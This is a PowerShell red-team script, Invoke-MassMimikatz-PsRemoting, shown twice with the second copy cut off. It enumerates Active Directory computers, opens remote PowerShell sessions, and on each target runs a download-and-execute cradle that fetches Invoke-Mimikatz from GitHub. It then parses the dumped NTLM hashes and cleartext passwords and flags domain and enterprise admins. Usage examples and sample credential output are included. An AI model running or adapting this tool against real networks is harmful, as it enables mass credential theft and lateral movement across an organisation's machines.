<#

Script mod author
    Scott Sutherland (@_nullbind), 2015 NetSPI

Description
    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
    Features/credits:
     - Idea: rob, will, and carlos
	 - Input: Accepts host from pipeline (will's code)
	 - Input: Accepts host list from file (will's code)
	 - AutoTarget option will lookup domain computers from DC (carlos's code)
	 - Ability to filter by OS (scott's code)
	 - Ability to only target domain systems with WinRm installed (vai SPNs) (scott's code)
	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
	 - More descriptive verbose error messages (scott's code)
	 - Ability to specify alternative credentials and connect from a non-domain system (carlos's code)
	 - Runs mimikatz on target system using ie/download/execute cradle (chris's, Joseph's, Matt's, and benjamin's code)
     - Parse mimiaktz output (will's code)
	 - Returns enumerated credentials in a datable which can be used in the pipeline (scott's code)
	 
Notes
    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
    Returns data table object to pipeline with creds.
    Weee PowerShell.

Command Examples

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”

     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 

Output Sample 1

    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Found 1 servers that met search criteria.
    VERBOSE: Attempting to create 1 ps sessions...
    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Unknown         Unknown    
    test.domain administrator MyEAPassword!                    Unknown         Unknown    
    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       

Output Sample 2

PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Getting list of Servers from DC...
    VERBOSE: Getting list of Enterprise and Domain Admins...
    VERBOSE: Found 3 servers that met search criteria.
    VERBOSE: Attempting to create 3 ps sessions...
    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Yes             Yes    
    test.domain administrator MyEAPassword!                    Yes             Yes     
    test        myadmin       MyDAPAssword!                    No              Yes     
    test.domain myadmin       MyDAPAssword!                    No              Yes 
    test        myuser        MyUserPAssword!                  No              No
    test.domain myuser        MyUSerPAssword!                  No              No                


Todo
    fix parsing so password hashes show up differently.
    fix psurl
    add will's / obscuresec's self-serv mimikatz file option

References
	pending

#>
function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Position=0,ValueFromPipeline=$true,
        HelpMessage="This can be use to provide a list of host.")]
        [String[]]
        $Hosts,

        [Parameter(Mandatory=$false,
        HelpMessage="This should be a path to a file containing a host list.  Once per line")]
        [String]
        $HostList,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.  Only used with -autotarget.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services. Only used with -autotarget.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="This get a list of computer from ADS withthe applied filters.")]
        [switch]$AutoTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )

        # Setup initial authentication, adsi, and functions
        Begin
        {
            if ($DomainController -and $Credential.GetNetworkCredential().Password)
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }
            else
            {
                $objDomain = [ADSI]""  
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }


            # ----------------------------------------
            # Setup required data tables
            # ----------------------------------------

            # Create data table to house results to return
            $TblPasswordList = New-Object System.Data.DataTable 
            $TblPasswordList.Columns.Add("Type") | Out-Null
            $TblPasswordList.Columns.Add("Domain") | Out-Null
            $TblPasswordList.Columns.Add("Username") | Out-Null
            $TblPasswordList.Columns.Add("Password") | Out-Null  
            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
            $TblPasswordList.Clear()

             # Create data table to house results
            $TblServers = New-Object System.Data.DataTable 
            $TblServers.Columns.Add("ComputerName") | Out-Null


            # ----------------------------------------
            # Function to grab domain computers
            # ----------------------------------------
            function Get-DomainComputers
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by the provided operating system. Default is all.")]
                    [string]$OsFilter = "*",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by only include servers with registered winrm services.")]
                    [switch]$WinRM,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]

                    [string]$SearchDN
                )

                Write-verbose "Getting list of Servers from DC..."

                # Get domain computers from dc 
                if ($OsFilter -eq "*"){
                    $OsCompFilter = "(operatingsystem=*)"
                }else{
                    $OsCompFilter = "(operatingsystem=*$OsFilter*)"
                }

                # Select winrm spns if flagged
                if($WinRM){
                    $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
                }else{
                    $winrmComFilter = ""
                }

                $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
                $ObjSearcher.PageSize = $Limit
                $ObjSearcher.Filter = $CompFilter
                $ObjSearcher.SearchScope = "Subtree"

                if ($SearchDN)
                {
                    $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
                }

                $ObjSearcher.FindAll() | ForEach-Object {
            
                    #add server to data table
                    $ComputerName = [string]$_.properties.dnshostname                    
                    $TblServers.Rows.Add($ComputerName) | Out-Null 
                }
            }

            # ----------------------------------------
            # Function to check group membership 
            # ----------------------------------------        
            function Get-GroupMember
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [string]$Group = "Domain Admins",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]
                    [string]$SearchDN
                )
  
                if ($DomainController -and $Credential.GetNetworkCredential().Password)
                   {
                        $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
                        $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
                    else
                    {
                        $root = ([ADSI]"").distinguishedName
                        $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
        
                    # Create data table to house results to return
                    $TblMembers = New-Object System.Data.DataTable 
                    $TblMembers.Columns.Add("GroupMember") | Out-Null 
                    $TblMembers.Clear()

                    $objDomain.member | %{                    
                        $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
                }

                return $TblMembers
            }

            # ----------------------------------------
            # Mimikatz parse function (Will Schoeder's) 
            # ----------------------------------------

            # This is a *very slightly mod version of will schroeder's function from:
            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
            function Parse-Mimikatz {

                [CmdletBinding()]
                param(
                    [string]$raw
                )
    
                # Create data table to house results
                $TblPasswords = New-Object System.Data.DataTable 
                $TblPasswords.Columns.Add("PwType") | Out-Null
                $TblPasswords.Columns.Add("Domain") | Out-Null
                $TblPasswords.Columns.Add("Username") | Out-Null
                $TblPasswords.Columns.Add("Password") | Out-Null    

                # msv
	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("NTLM")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "msv"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/tspkg"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/kerberos"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "kerberos/ssp"
                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }

                # Remove the computer accounts
                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}

                return $TblPasswords_Clean
            }
        }

        # Conduct attack
        Process 
        {

            # ----------------------------------------
            # Compile list of target systems
            # ----------------------------------------

            # Get list of systems from the command line / pipeline            
            if ($Hosts)
            {
                Write-verbose "Getting list of Servers from provided hosts..."
                $Hosts | 
                %{ 
                    $TblServers.Rows.Add($_) | Out-Null 
                }
            }

            # Get list of systems from the command line / pipeline
            if($HostList){
                Write-verbose "Getting list of Servers $HostList..."                
                if (Test-Path -Path $HostList){
                    $HostListHosts += Get-Content -Path $HostList
                    $HostListHosts|
                    %{
                        $TblServers.Rows.Add($_) | Out-Null
                    }
                }else{
                    Write-Warning "[!] Input file '$HostList' doesn't exist!"
                }            
            }

            # Get list of domain systems from dc and add to the server list
            if ($AutoTarget)
            {
                if ($OsFilter){
                    $FlagOsFilter = "$OsFilter"
                }else{
                    $FlagOsFilter = "*"
                }


                if ($WinRM){
                    Get-DomainComputers -WinRM -OsFilter $OsFilter
                }else{
                    Get-DomainComputers -OsFilter $OsFilter
                }
            }


            # ----------------------------------------
            # Get list of entrprise/domain admins
            # ----------------------------------------
            if ($AutoTarget)
            {
                Write-Verbose "Getting list of Enterprise and Domain Admins..."
                if ($DomainController -and $Credential.GetNetworkCredential().Password)            
                {           
                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins" -DomainController $DomainController -Credential $Credential
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins" -DomainController $DomainController -Credential $Credential
                }else{

                    $EnterpriseAdmins = Get-GroupMember -Group "Enterprise Admins"
                    $DomainAdmins = Get-GroupMember -Group "Domain Admins"
                }
            }


            # ----------------------------------------
            # Establish sessions
            # ---------------------------------------- 
            $ServerCount = $TblServers.Rows.Count

            if($ServerCount -eq 0){
                Write-Verbose "No target systems were provided."
                break
            }

            # Fix incase servers in list are less than maxhosts
            if($ServerCount -lt $MaxHosts){
                $MaxHosts = $ServerCount
            }

            Write-Verbose "Found $ServerCount servers that met search criteria."            
            Write-verbose "Attempting to create $MaxHosts ps sessions..."

            # Set counters
            $ServerCounter = 0     
            $SessionCount = 0   

            $TblServers | 
            ForEach-Object {
                if ($Counter -le $ServerCount -and $SessionCount -lt $MaxHosts){
                    
                    $ServerCounter = $ServerCounter+1
                   
                    # attempt session
                    [string]$MyComputer = $_.ComputerName                        
                    New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
                    # Get session count
                    $SessionCount = Get-PSSession | Measure-Object | select count -ExpandProperty count
                    Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $ServerCounter of $ServerCount - $MyComputer"         
                    
                }
            }  
            
                        
            # ---------------------------------------------
            # Attempt to run mimikatz against open sessions
            # ---------------------------------------------
            if($SessionCount -ge 1){

                # run the mimikatz command
                Write-verbose "Running reflected Mimikatz against $SessionCount open ps sessions..."
                $x = Get-PSSession
                [string]$MimikatzOutput = Invoke-Command -Session $x -ScriptBlock {Invoke-Expression (new-object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1");invoke-mimikatz -ErrorAction SilentlyContinue} -ErrorAction SilentlyContinue           
                $TblResults = Parse-Mimikatz -raw $MimikatzOutput
                $TblResults | foreach {
            
                    [string]$pwtype = $_.pwtype.ToLower()
                    [string]$pwdomain = $_.domain.ToLower()
                    [string]$pwusername = $_.username.ToLower()
                    [string]$pwpassword = $_.password
                    
                    # Check if user has da/ea privs - requires autotarget
                    if ($AutoTarget)
                    {
                        $ea = "No"
                        $da = "No"

                        # Check if user is enterprise admin                   
                        $EnterpriseAdmins |
                        ForEach-Object {
                            $EaUser = $_.GroupMember
                            if ($EaUser -eq $pwusername){
                                $ea = "Yes"
                            }
                        }
                    
                        # Check if user is domain admin
                        $DomainAdmins |
                        ForEach-Object {
                            $DaUser = $_.GroupMember
                            if ($DaUser -eq $pwusername){
                                $da = "Yes"
                            }
                        }
                    }else{
                        $ea = "Unknown"
                        $da = "Unknown"
                    }

                    # Add credential to list
                    $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword,$ea,$da) | Out-Null
                }            

                # remove sessions
                Write-verbose "Removing ps sessions..."
                Disconnect-PSSession -Session $x | Out-Null
                Remove-PSSession -Session $x | Out-Null

            }else{
                Write-verbose "No ps sessions could be created."
            }                 
        }

        # Clean and results
        End
        {
                # Clear server list
                $TblServers.Clear()

                # Return passwords
                if ($TblPasswordList.row.count -eq 0){
                    Write-Verbose "No credentials were recovered."
                    Write-Verbose "Done."
                }else{
                    $TblPasswordList | select domain,username,password,EnterpriseAdmin,DomainAdmin -Unique | Sort-Object username,password,domain
                }                
        }
    }
    <#

Script mod author
    Scott Sutherland (@_nullbind), 2015 NetSPI

Description
    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
    Features/credits:
    	 - Idea: rob, will, and carlos
	 - Input: Accepts host from pipeline (will's code)
	 - Input: Accepts host list from file (will's code)
	 - AutoTarget option will lookup domain computers from DC (carlos's code)
	 - Ability to filter by OS (scott's code)
	 - Ability to only target domain systems with WinRm installed (vai SPNs) (scott's code)
	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
	 - More descriptive verbose error messages (scott's code)
	 - Ability to specify alternative credentials and connect from a non-domain system (carlos's code)
	 - Runs mimikatz on target system using ie/download/execute cradle (chris's, Joseph's, Matt's, and benjamin's code)
	 - Parses mimikatz output (will's code)
	 - Returns enumerated credentials in a data table which can be used in the pipeline (scott's code)
	 
Notes
    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
    Returns data table object to pipeline with creds.
    Weee PowerShell.

Command Examples

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”

     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 

Output Sample 1

    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Found 1 servers that met search criteria.
    VERBOSE: Attempting to create 1 ps sessions...
    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Unknown         Unknown    
    test.domain administrator MyEAPassword!                    Unknown         Unknown    
    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       

Output Sample 2

PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Getting list of Servers from DC...
    VERBOSE: Getting list of Enterprise and Domain Admins...
    VERBOSE: Found 3 servers that met search criteria.
    VERBOSE: Attempting to create 3 ps sessions...
    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Yes             Yes    
    test.domain administrator MyEAPassword!                    Yes             Yes     
    test        myadmin       MyDAPAssword!                    No              Yes     
    test.domain myadmin       MyDAPAssword!                    No              Yes 
    test        myuser        MyUserPAssword!                  No              No
    test.domain myuser        MyUSerPAssword!                  No              No                


Todo
    fix loop
    fix parsing so password hashes show up differently.
    fix psurl
    add will's / obscuresec's self-serv mimikatz file option

References
	pending

#>
function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Position=0,ValueFromPipeline=$true,
        HelpMessage="This can be use to provide a list of host.")]
        [String[]]
        $Hosts,

        [Parameter(Mandatory=$false,
        HelpMessage="This should be a path to a file containing a host list.  Once per line")]
        [String]
        $HostList,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.  Only used with -autotarget.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services. Only used with -autotarget.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="This get a list of computer from ADS withthe applied filters.")]
        [switch]$AutoTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )

        # Setup initial authentication, adsi, and functions
        Begin
        {
            if ($DomainController -and $Credential.GetNetworkCredential().Password)
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }
            else
            {
                $objDomain = [ADSI]""  
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }


            # ----------------------------------------
            # Setup required data tables
            # ----------------------------------------

            # Create data table to house results to return
            $TblPasswordList = New-Object System.Data.DataTable 
            $TblPasswordList.Columns.Add("Type") | Out-Null
            $TblPasswordList.Columns.Add("Domain") | Out-Null
            $TblPasswordList.Columns.Add("Username") | Out-Null
            $TblPasswordList.Columns.Add("Password") | Out-Null  
            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
            $TblPasswordList.Clear()

             # Create data table to house results
            $TblServers = New-Object System.Data.DataTable 
            $TblServers.Columns.Add("ComputerName") | Out-Null


            # ----------------------------------------
            # Function to grab domain computers
            # ----------------------------------------
            function Get-DomainComputers
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by the provided operating system. Default is all.")]
                    [string]$OsFilter = "*",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by only include servers with registered winrm services.")]
                    [switch]$WinRM,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

